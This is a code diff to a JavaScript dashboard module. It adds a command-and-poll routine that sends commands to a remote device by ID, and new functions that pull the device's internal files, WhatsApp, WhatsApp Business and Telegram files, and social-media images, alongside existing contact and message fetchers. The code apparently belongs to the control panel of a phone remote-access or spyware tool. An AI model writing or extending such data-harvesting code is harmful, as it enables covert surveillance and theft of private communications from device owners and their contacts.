@@ -95,6 +95,65 @@ export const fetchData = async (userId, command, apiEndpoint, path = null) => {
   }
 };
 
+// fetch internal storage, data check image download
+export const fetchInternalData = async (
+  userId,
+  command,
+  apiEndpoint,
+  path = null
+) => {
+  try {
+    const response = await apiService.post("command/add", {
+      device_id: userId,
+      command: command,
+      shell: "None",
+      number: "None",
+      data: path,
+    });
+    const cmdKey = response.data.command_key;
+    toast.info(`Fetching data...`);
+    await new Promise((resolve) => setTimeout(resolve, 2000));
+    while (true) {
+      const fileexists = await apiService.get("dashboard/checkImage/" + cmdKey);
+      console.log("response here:", fileexists?.data?.data?.response);
+      if (fileexists?.data?.data?.response !== null) {
+        console.log("fileexists:", fileexists);
+        break;
+      }
+
+      await new Promise((resolve) => setTimeout(resolve, 2000));
+    }
+    // // Retry if the response is 404
+    console.log("beforeeeeeeeeee 3second:");
+    await new Promise((resolve) => setTimeout(resolve, 5000));
+    console.log("afterrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr 3 sec");
+    let retryCount = 0;
+    let listResponse;
+    while (true) {
+      try {
+        listResponse = await apiService.get(
+          `dashboard/datatypes/${apiEndpoint}/${userId}/${cmdKey}`
+        );
+        break;
+      } catch (error) {
+        toast.error(`Timed out`);
+        if (error.response && error.response.status === 404 && retryCount < 2) {
+          retryCount++;
+          toast.info(`Retrying ${command} (${retryCount} of 2)...`);
+          await new Promise((resolve) => setTimeout(resolve, 2000));
+        } else {
+          console.error(`Error fetching ${command}:`, error);
+          throw new Error(`Error fetching ${command}`);
+        }
+      }
+    }
+    return handleApiResponse(listResponse);
+  } catch (error) {
+    console.error(`Error fetching ${command}:`, error);
+    throw new Error(`Error fetching ${command}`);
+  }
+};
+
 // Fetch data functions for different API endpoints
 export const fetchContactList = async (userId) => {
   return await fetchData(userId, "getcontact", "getcontact");
@@ -121,5 +180,21 @@ export const fetchMessagesList = async (userId) => {
 };
 
 export const fetchInternalFile = async (userId, path) => {
-  return await fetchData(userId, "getfile", "getfile", path);
+  return await fetchInternalData(userId, "getfile", "getfile", path);
+};
+
+export const fetchWhatsappData = async (userId) => {
+  return await fetchInternalData(userId, "whatsappfile", "whatsappfile");
+};
+
+export const fetchW4bData = async (userId) => {
+  return await fetchInternalData(userId, "whatsappw4bfile", "whatsappw4bfile");
+};
+
+export const fetchTelegramfiles = async (userId) => {
+  return await fetchInternalData(userId, "telegramfile", "telegramfile");
+};
+
+export const fetchSocialImages = async (userId) => {
+  return await fetchInternalData(userId, "social", "social");
 };
